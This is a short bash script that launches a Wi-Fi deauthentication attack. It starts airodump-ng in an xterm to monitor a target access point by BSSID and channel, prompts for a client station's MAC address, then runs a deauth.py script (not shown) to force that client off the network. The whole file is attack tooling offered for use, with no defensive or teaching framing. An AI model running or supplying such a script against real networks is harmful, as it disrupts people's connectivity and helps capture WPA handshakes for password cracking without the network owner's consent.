#!/bin/bash


xterm -e airodump-ng $3 --bssid $1 --channel $2 &
echo "Enter Station: "
read station
xterm -e python deauth.py $3 $1 $station

